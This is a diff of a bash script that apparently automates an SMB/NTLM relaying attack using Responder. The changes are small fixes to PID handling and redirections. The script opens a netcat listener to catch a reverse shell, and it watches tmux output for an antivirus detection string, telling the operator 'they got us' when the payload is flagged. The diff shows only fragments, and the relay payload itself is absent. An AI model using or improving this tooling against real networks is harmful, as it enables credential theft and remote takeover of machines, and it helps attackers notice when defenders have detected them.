@@ -33,25 +33,25 @@ function cleaning(){
 	fi
 
 	if [ ! -z $terminal_nc_PID ];then
-		kill -9 $terminal_nc_PID &>/dev/null
+		kill -9 $terminal_nc_PID 2>/dev/null
 		wait $terminal_nc_PID &>/dev/null
-    	fi
+   	fi
 	
 	tput cnorm; exit 1
 	
 }
 
 function badExit(){
-	
+
 	cleaning
 	tput cnorm; exit 1
-	
+
 }
 
 function goodExit(){
 
 	tput cnorm; exit 0
-	
+
 }
 
 function ctrl_c(){
@@ -110,21 +110,20 @@ function checkApt(){
 
 function makeBck(){
 
-	test -f "$(pwd)/responder/Responder.conf.old" &>/dev/null
-	if [ $? -eq 1 ];then
+	if [ ! -e "$(pwd)/responder/Responder.conf.old" ];then
 		if [ ! -z $quiet ];then echo -e "\t${blueColour}[:*]${endColour} Making copy of '$(pwd)/responder/Responder.conf' to '$(pwd)/responder/Responder.conf.old'\n"; sleep 0.5; fi
 		cp $(pwd)/responder/Responder.conf $(pwd)/responder/Responder.conf.old
 	fi
-	
+
 }
 
 function checkProgramsNeeded(){
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Updating apt...\n"; sleep 0.5; fi
 	apt update &>/dev/null
-	
+
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Checking for dependencies needed...\n"; sleep 0.5; fi
-	
+
 	programs=(tmux rlwrap python3 netcat wget xterm net-tools)
 	for program in "${programs[@]}"; do checkApt $program; done
 
@@ -319,22 +318,22 @@ function relayingAttack(){
 	command="$SHELL -c 'tput setaf 7; rlwrap nc -lvvnp $lport'"
 	if [ $terminal == "gnome" ];then 
 		gnome-terminal --window --hide-menubar -e "$command" &> /dev/null &
-		terminal_nc_PID=!$
 	elif [ $terminal == "termite" ];then
 		termite -hold -e "$command" &>/dev/null &
-		terminal_nc_PID=!$
 	else
-        	checkDependency "xterm"; checkDependency "rlwrap"
-	        xterm -hold -T 'XTerm' -e "$command" &>/dev/null &
-		terminal_nc_PID=!$
+        checkDependency "xterm"; checkDependency "rlwrap"
+	    xterm -hold -T 'XTerm' -e "$command" &>/dev/null &
 	fi
-	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to locate terminal in the system. Existing...\n"; badExit; else sleep 3; fi
+	terminal_nc_PID=$!
+	
+    if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to locate terminal in the system. Existing...\n"; badExit; else sleep 3; fi
 
 	portStatus=$(netstat -tunalp | grep $lport | awk '{print $6}' | sort -u)
 	while [ "$portStatus" == "LISTEN" ];do
 		portStatus=$(netstat -tnualp | grep $lport | awk '{print $6}' | sort -u);
-        if [[ $(tmux select-pane -t 3 && tmux capture-pane -p | grep 'ScriptContainedMaliciousContent') -eq 0 ]];then
-          echo -e "${redColour}[:O]${endColour} Oh man, they got us! Throw this pc to the sea and run far away from here"; badExit
+        tmux capture-pane -p | grep 'ScriptContainedMaliciousContent' &>/dev/null
+        if [ $? -eq 0 ];then
+          echo -e "${redColour}[:O]${endColour} Oh man, they got us! Throw this pc to the sea and run far away from here\n"; badExit
         fi
 	done
 
